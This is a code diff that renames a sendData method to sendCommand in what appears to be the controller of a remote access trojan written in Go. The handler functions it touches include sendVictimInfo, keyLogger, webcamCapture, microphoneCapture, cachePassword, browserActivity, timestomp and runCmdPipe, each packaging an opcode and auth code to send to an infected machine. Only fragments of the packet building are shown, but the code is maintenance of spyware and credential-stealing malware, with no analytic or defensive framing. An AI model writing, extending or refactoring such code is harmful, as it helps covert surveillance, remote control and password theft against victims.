@@ -204,7 +204,7 @@ func logCommand(c command) {
 	log.Debug("  Data:\n%s", hex.Dump(c.data))
 }
 
-func (h *Handler) sendData(c command) error {
+func (h *Handler) sendCommand(c command) error {
 	result := make([]byte, 13+len(c.data))
 
 	result[0] = c.opcode
@@ -243,7 +243,7 @@ func (h *Handler) sendVictimInfo() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) listDrives() {
@@ -255,7 +255,7 @@ func (h *Handler) listDrives() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) directoryList(path string) {
@@ -269,7 +269,7 @@ func (h *Handler) directoryList(path string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) uploadFile(src string, dst string) {
@@ -290,7 +290,7 @@ func (h *Handler) uploadFile(src string, dst string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) downloadFile(src string) {
@@ -304,7 +304,7 @@ func (h *Handler) downloadFile(src string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) copyFile(src string, directory string) {
@@ -318,7 +318,7 @@ func (h *Handler) copyFile(src string, directory string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) moveFile(src string, directory string) {
@@ -332,7 +332,7 @@ func (h *Handler) moveFile(src string, directory string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) renameFile(src string, dst string) {
@@ -346,7 +346,7 @@ func (h *Handler) renameFile(src string, dst string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) deleteFile(src string) {
@@ -360,7 +360,7 @@ func (h *Handler) deleteFile(src string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) createDirectory(directory string) {
@@ -374,7 +374,7 @@ func (h *Handler) createDirectory(directory string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) timestomp(src string) {
@@ -388,7 +388,7 @@ func (h *Handler) timestomp(src string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) processList() {
@@ -400,7 +400,7 @@ func (h *Handler) processList() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) killProcess(pid int) {
@@ -414,7 +414,7 @@ func (h *Handler) killProcess(pid int) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) serviceList() {
@@ -426,7 +426,7 @@ func (h *Handler) serviceList() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) startService(serviceName string) {
@@ -440,7 +440,7 @@ func (h *Handler) startService(serviceName string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) stopService(serviceName string) {
@@ -454,7 +454,7 @@ func (h *Handler) stopService(serviceName string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) runCmdPipe(input string) {
@@ -468,7 +468,7 @@ func (h *Handler) runCmdPipe(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) loadLibrary(library string) {
@@ -482,7 +482,7 @@ func (h *Handler) loadLibrary(library string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) unloadLibrary(library string) {
@@ -496,7 +496,7 @@ func (h *Handler) unloadLibrary(library string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) getFileSize(file string) {
@@ -510,7 +510,7 @@ func (h *Handler) getFileSize(file string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) getScreenshot() {
@@ -522,7 +522,7 @@ func (h *Handler) getScreenshot() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) microphoneCapture(input string) {
@@ -536,7 +536,7 @@ func (h *Handler) microphoneCapture(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) keyLogger(input string) {
@@ -550,7 +550,7 @@ func (h *Handler) keyLogger(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) browserActivity(input string) {
@@ -570,7 +570,7 @@ func (h *Handler) browserActivity(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) cachePassword(input string) {
@@ -584,7 +584,7 @@ func (h *Handler) cachePassword(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) disconnect() {
@@ -596,7 +596,7 @@ func (h *Handler) disconnect() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) getLog() {
@@ -608,7 +608,7 @@ func (h *Handler) getLog() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) webcamCapture(input string) {
@@ -622,7 +622,7 @@ func (h *Handler) webcamCapture(input string) {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) uninstall() {
@@ -634,7 +634,7 @@ func (h *Handler) uninstall() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
 
 func (h *Handler) listOpenWindows() {
@@ -646,5 +646,5 @@ func (h *Handler) listOpenWindows() {
 	cmd.unused = 0x0
 	cmd.authCode = authCode
 	cmd.data = data
-	h.sendData(cmd)
+	h.sendCommand(cmd)
 }
